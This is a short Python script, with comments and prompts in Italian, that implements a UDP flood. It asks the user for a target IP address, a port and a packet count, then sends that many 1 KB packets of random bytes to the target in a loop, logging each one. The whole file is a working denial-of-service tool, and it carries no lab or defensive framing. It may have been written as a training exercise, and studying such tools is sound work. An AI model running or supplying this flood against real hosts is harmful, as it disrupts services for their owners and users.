import socket
import random
import sys

def udp_flood(target_ip, target_port, packet_count):
    # Crea un socket UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Genera un pacchetto di 1 KB di byte casuali
    packet_size = 1024  # 1 KB
    packet = random._urandom(packet_size)
    
    print(f"[INFO] Inizio invio pacchetti UDP verso {target_ip}:{target_port}")
    
    # Invia i pacchetti specificati
    try:
        for i in range(packet_count):
            client.sendto(packet, (target_ip, target_port))
            print(f"[INFO] Pacchetto {i+1}/{packet_count} inviato")
    except KeyboardInterrupt:
        print("\n[INFO] Interrotto dall'utente")
    except Exception as e:
        print(f"[ERRORE] Si è verificato un errore: {e}")
    finally:
        client.close()
        print("[INFO] Connessione chiusa")

if __name__ == "__main__":
    try:
        # Input dell'IP Target
        target_ip = input("Inserisci l'indirizzo IP della macchina target: ")
        
        # Input della Porta Target
        target_port = int(input("Inserisci la porta UDP della macchina target: "))
        
        # Input del numero di pacchetti da inviare
        packet_count = int(input("Inserisci il numero di pacchetti da 1 KB da inviare: "))
        
        # Chiamata alla funzione di flood
        udp_flood(target_ip, target_port, packet_count)
    
    except ValueError:
        print("[ERRORE] Inserisci valori validi!")
    except Exception as e:
        print(f"[ERRORE] Si è verificato un errore: {e}")
